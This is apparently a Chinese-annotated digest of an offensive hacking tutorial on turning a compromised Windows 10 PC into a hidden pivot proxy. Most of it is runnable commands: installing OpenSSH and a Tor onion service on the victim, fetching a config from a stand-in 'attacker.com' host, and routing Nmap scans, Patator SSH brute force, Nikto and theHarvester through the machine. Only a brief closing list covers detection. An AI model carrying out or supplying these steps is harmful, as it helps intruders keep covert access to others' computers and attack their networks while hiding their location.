## How to Turn Compromised Windows PCs into Web Proxies [^1]

### Why Would Someone Do This to My Computer?

- 入侵者：受感染的设备将充当渗透系统，允许攻击者瞄准网络上的其他机器
- 安全人员：直接从受感染设备使用[Nikto](https://null-byte.wonderhowto.com/how-to/scan-for-vulnerabilities-any-website-using-nikto-0151729/)，[Nmap](https://null-byte.wonderhowto.com/collection/nmap/)，[Patator](https://tools.kali.org/password-attacks/patator)，[curl](https://www.geeksforgeeks.org/curl-command-in-linux-with-examples/)和[TheHarvester](https://null-byte.wonderhowto.com/how-to/scrape-target-email-addresses-with-theharvester-0176307/)等工具通常具有挑战性。但是使用代理，并且通过Windows 10设备使用这些工具，从而为实际转向其他设备提供了许多机会

### Attack Scenario Requirements

- **远程访问**：本文假设已建立某种程度的远程访问
- **管理员权限**：如果目标Windows 10操作系统上未安装OpenSSH，则需要管理员（即root）权限才能安装和设置。其中某些较新版本的Windows 10已安装并运行了SSH服务器
- **帐户密码**：用户的帐户密码是设置登录SSH服务器所必需的，如果没有可以远程创建新用户，或者将OpenSSH服务器配置为允许没有密码的登录。但最好是Windows 10 管理员账号和密码

### Important Note [^2]

### Is OpenSSH Already Installed & Running? [^3]

`> ls "C:\Program Files\OpenSSH\"`

`> Get-NetTCPConnection -State Listen` [^4]

`> netstat -ba` [^5]

`> Get-Process | findstr sshd`

1. Set Up SSH on the Target Windows 10 Computer

   - Download the OpenSSH Installer Script

     ```powershell
     # 执行Invoke-WebRequest（iwr）下载OpenSSH二进制文件之前，必须使用以下命令定义SecurityProtocol
     > [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     > iwr https://github.com/PowerShell/Win32-OpenSSH/releases/download/v7.9.0.0p1-Beta/OpenSSH-Win64.zip -o $env:temp\OpenSSH-Win64.zip
     ```

     

   - Unzip the OpenSSH Archive

     `> Expand-Archive -Path "$env:temp\OpenSSH-Win64.zip" -DestinationPath 'C:\Program Files\OpenSSH' -Force`

   - Execute the OpenSSH Install Script

     `> & "C:\Program Files\OpenSSH\OpenSSH-Win64\install-sshd.ps1"`

   - Start the OpenSSH Service

     `> net start sshd`

   - Verify the OpenSSH Server Is Running

     `> Get-NetTCPConnection -State Listen`

2. Set Up Tor on the Target Windows 10 Computer

   - Download the Tor ZIP

     `> iwr 'https://www.torproject.org/dist/torbrowser/8.0.9/tor-win32-0.3.5.8.zip' -o $env:temp\tor.zip`

   - Extract the Tor Archive

     ```powershell
     > Expand-Archive -Path $env:TEMP\tor.zip -DestinationPath $env:TEMP\tor\
     > cd $env:TEMP\tor\Tor\
     ls
     # 目录下没有配置文件 torrc
     ```

   - Create the Torrc Configuration File [^6]

     ```powershell
     # 使用PowerShell中的`$env`变量验证目标的用户名,torrc配置文件需要此用户名
     > echo $env:username
     # 在Kali或虚拟专用服务器中，创建一个名为“torrc”的文件，并将以下torrc配置保存到该文件中。或者将此文件托管在文件共享服务器或GitHub上
     HiddenServiceDir C:\Users\USERNMAE\AppData\Local\Temp\tor\Tor\HS\
     HiddenServicePort 22 127.0.0.1:22
     ```

     

   - Download the Torrc from Attacker's System

     ```bash
     ~$ python3 -m http.server 80
     > iwr attacker.com/torrc -o torrc
     # 使用ls来验证torrc文件是否已正确保存
     > ls
     > cat torrc
     ```

     

   - Start the Tor Process

     `> Start-Process -NoNewWindow -FilePath .\tor.exe -ArgumentList '-f','torrc'` [^7]

   - Find the Onion Address

     `> cat HS\hostname `[^8]

3. Connect to the OpenSSH Server Through Tor

   - Install Tor in Kali Linux

     **Ref:** [使用Tor配置SSH Server避免被Shodan搜索](https://null-byte.wonderhowto.com/how-to/set-up-ssh-server-with-tor-hide-from-shodan-hackers-0194455/#jump-step1)

   - Test the SSH Connection

     ```bash
     # 确保可以从Kali系统访问SSH服务器。该torsocks命令应该已经被包含在Tor的包里。如果没有就使用以下命令安装它
     ~$ apt-get install torsocks
     ~$ torsocks ssh -v -p22 user@w6ngcsz3qryotaq5imneza5edidxvmr6fbefe4lxl3wabjagxagxdaqd.onion
     # 键入`exit`或按 Ctrl + D 退出SSH会话
     ```

     

   - Enable the Proxy Option

     ```bash
     # 打开一个新终端并键入以下命令在1337端口上创建SOCKS5代理端口。此端口号是任意的，可以更改为低于65535的任何值
     ~$ torsocks ssh -D 1337 -C -p22 tokyoneon@w6ngcsz3qryotaq5imneza5edidxvmr6fbefe4lxl3wabjagxagxdaqd.onion
     # 这里将出现一个新的SSH终端。这并不意味着要与之互动。只要此终端处于打开状态，代理将保持可用状态。在Kali中，使用`ss`命令验证是否已打开代理端口以查看可用的侦听端口。请注意127.0.0.1上的1337端口 - 这可以通过被入侵者攻占的Windows 10计算机使用入侵工具和Web浏览器来配置并且代理请求
     ~$ ss -tpl
     ```

     

4. Configure Hacking Tools to Use the Proxy

   - Install Proxychains

     ```bash
     ~$ apt-get install proxychains
     # 默认情况下，Proxychains将在端口9050上配置Tor的匿名代理请求。我们没有使用代理链来实现此目的，因此需要修改配置文件
     ~$ nano /etc/proxychains.conf
     # 将文件中的最后一行从“socks4 127.0.0.1 9050”更改为“socks5 127.0.0.1 1337”并退出nano
     ```

     

   - Proxy Nmap Scans

     `~$ proxychains nmap -p80,22,21,443,8080,8443 -sS -T5 192.168.1.1/24` [^9]

   - Proxy Curl Commands [^10]

     ```bash
     ~$ curl --proxy socks5://127.0.0.1:1337 -I 'http://192.168.1.225'
     ~$ proxychains curl http://192.168.1.225:8080
     ```

     

   - Proxy Patator Brute-Force Attacks [^11]

     `~$ proxychains patator ssh_login host=192.168.1.225 port=22 user=root password=FILE0 0=/tmp/simple_wordlist.txt -t 1`

   - Proxy theHarvester Scans [^12]

     `~$ proxychains theharvester -d nmap.org -l 200 -b bing,censys,yahoo`

   - Proxy Nikto Scans [^13]

     `~$ proxychains nikto -host 192.168.1.225 -port 8080 -nossl`

   -  Proxy Web Requests with Firefox [^14]

### How to Protect Yourself (Conclusion) [^15]

- Inspect Outgoing Traffic with Wireshark [^16]
- Create Strict Firewall Rules with [pfSense](https://www.pfsense.org/)
- Monitor Running Processes with Task Manager [^17]



[原文](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-turn-compromised-windows-pcs-into-web-proxies-0197334/)

---

[^1]: 拥有对Windows 10计算机的特权访问权限的入侵者可以将其配置为充当Web代理，从而允许攻击者通过受感染的计算机定位网络上的设备和服务。探测和攻击都来自Windows 10计算机，因此很难检测到攻击者的实际位置。本指南中使用Tor代理，但是像[ngrok](https://ngrok.com/)和[Serveo](https://serveo.net/)这样的其他工具可能会起到替代作用，但是这些服务尚未经过测试，主要是因为Tor连接是加密和私有的
[^2]: 在本指南中，以`>`开头的代码块表示该命令应该在Windows 10系统上使用PowerShell执行（即Netcat后门）。以`〜$`开头的代码块表示执行Kali Linux命令
[^3]: SSH 服务器与大多数Windows 10版本中的SSH 客户端不同。如果已经安装了OpenSSH，则可以在没有管理员（root）权限的情况下执行以下大多数攻击。但是如果未安装OpenSSH，则需要管理员权限才能安装它
[^4]: 因为可以将给定服务的默认端口号更改为任意值，所以输出不是100％正确
[^5]: 使用`netstat`，可以识别使用给定端口的服务
[^6]: 在`ls`输出中，注意到没有 [torrc](https://2019.www.torproject.org/docs/faq.html.en#torrc) 配置文件，它其中包含Tor应如何配置的说明。而此时我们希望Tor创建一个新的洋葱服务地址，当使用`echo`和其他PowerShell文件创建命令创建torrc文件时，会发生一些恼人的[换行错误](https://stackoverflow.com/questions/9280591/avoid-newline-in-echo)。最终选择在远程服务器上托管所需的torrc文件，只需使用PowerShell下载即可
[^7]: 执行命令后等待 Netcat 终端读取“Bootstrapped 100％：Done”，这表明它已经正常启动，按键盘上的*Enter* 键返回交互式 Netcat shell
[^8]: Tor启动后，将创建一个名为“HS”的新目录。在此目录中可以找到包含洋葱地址的主机名文件
[^9]: 一旦创建SOCKS5代理，许多人可能会尝试通过Windows 10计算机执行Nmap扫描。但Nmap 对内置的[代理功能支持有限](https://security.stackexchange.com/questions/120708/nmap-through-proxy/120723#120723)。即使与代理链配合使用，也不会支持所有Nmap的扫描类型
[^10]: [Curl](https://linux.die.net/man/1/curl) 是一个功能强大的命令行工具，用于创建不同类型的Web请求，支持许多不同的协议和功能。它可用于枚举网络上设备上找到的Web服务器类型。与其他许多工具不同，curl具有内置的SOCKS5支持，可以使用`--proxy`选项调用
[^11]: Patator 是一个命令行强制执行工具。使用代理链，Patator可用于通过Windows 10计算机强制执行服务。虽然未经测试，但同样的语法可以与其他强力工具如 Hydra 和 Medusa 一起使用
[^12]: TheHarvester 是一个信息收集工具。它具有执行虚拟主机验证，DNS枚举，反向域搜索和IP查找以及进行 Shodan 查询的功能
[^13]: Nikto 是一个简单的Web服务器扫描程序，它可以检查网站并报告发现的漏洞
[^14]: 某些情况下，可以通过MAC和IP地址定义黑名单和白名单规则方法来安全的访问Web服务。例如，特定路由器将仅允许某些Windows 10计算机访问路由器的网关.。但是可以伪造Kali的MAC和IP地址来诱骗路由器让我们查看网关。同时也可以使用SSH代理来实现相同的目标
[^15]: 需要注意的是，这只表明攻击者可以使用受感染的计算机作为代理的一种方式。在本文的早期概念中，目标的路由器和Windows 10防火墙被修改为允许端口转发和远程访问。这也将允许攻击者从世界上任何地方访问SSH服务器。此外，可能并不总是需要管理员权限。例如，Tor可以在没有特殊权限的情况下下载和使用，并且可以配置为将请求转发到网络上的任何服务或端口，而无需使用SSH服务器或SOCKS5代理
[^16]: 如果攻击者正在使用Tor，则可以在 [ExoneraTor](https://metrics.torproject.org/exonerator.html)上找到Tor服务器。同样，在Wireshark捕获中可以轻松检测到 Netcat 流量
[^17]: 这种解决方案并不总是完全有效，因为进程名称可以更改或欺骗，但是懒惰的入侵者可能会将这些文件名称保留为默认名称（即 “tor.exe”）